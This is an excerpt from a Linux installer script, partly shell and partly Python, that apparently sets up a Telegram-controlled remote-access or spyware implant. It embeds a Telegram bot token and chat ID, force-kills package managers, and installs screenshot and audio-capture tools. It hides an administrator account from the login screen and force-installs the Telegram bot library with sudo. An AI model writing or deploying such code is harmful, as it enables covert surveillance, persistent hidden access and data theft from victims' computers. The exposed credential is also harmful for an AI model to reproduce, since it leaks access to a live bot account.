...
# CONFIGURATION
BOT_TOKEN = "8443342433:AAE_x1cUJegcNFfg29w6jC1r63MofSqjk-E"
CHAT_ID = "8550252693"
...
# Send all output in real-time to a dedicated log file
INSTALL_LOG="/tmp/realtime_install.log"
...
if command -v apt-get &> /dev/null; then
    ...
    log "[*] Force clearing apt locks to ensure immediate installation..."
    killall -9 apt apt-get dpkg unattended-upgrades &>/dev/null || true
    ...
    apt-get install -y --fix-missing python3-pip curl alsa-utils scrot ffmpeg x11-utils gnome-screenshot
...
python3 -m pip install -q python-telegram-bot requests --break-system-packages || python3 -m pip install -q python-telegram-bot requests
...
# Hide user from the login screen (GDM/LightDM) by using AccountsService
mkdir -p /var/lib/AccountsService/users
cat <<EOF > /var/lib/AccountsService/users/{SYS_ADMIN_USER}
[User]
SystemAccount=true
EOF
systemctl restart accounts-daemon &>/dev/null || true
...
def run_bot():
    ...
    # NOTE: We test `from telegram import Update` (not just `import telegram`)
    # because a stale bare `telegram` package can satisfy `import telegram`
    # while not providing Update, ApplicationBuilder, etc.
    try:
        from telegram import Update as _TGUpdate
        from telegram.ext import ApplicationBuilder as _TGApp
        import requests
        log("python-telegram-bot and requests already installed, skipping install.")
    except (ImportError, Exception):
        log("Installing / force-reinstalling python-telegram-bot and requests...")
        # Force-reinstall to remove any conflicting bare `telegram` package
        result = subprocess.run(
            ["sudo", "pip3", "install", "--upgrade", "--force-reinstall",
             "python-telegram-bot", "requests", "--break-system-packages", "--quiet"],
            stdout=subprocess.PIPE, stderr=subprocess.STDOUT
        )
        if result.returncode != 0:
            result = subprocess.run(
                ["sudo", "pip3", "install", "--upgrade", "--force-reinstall",
                 "python-telegram-bot", "requests", "--quiet"],
                stdout=subprocess.PIPE, stderr=subprocess.STDOUT
            )

        if result.returncode != 0:
            log(f"Dependencies install failed: {result.stdout.decode().strip()}")
            return  # Exit to prevent infinite loop

        log(result.stdout.decode().strip() or "Install complete.")
        # Restart self so the newly installed package is picked up
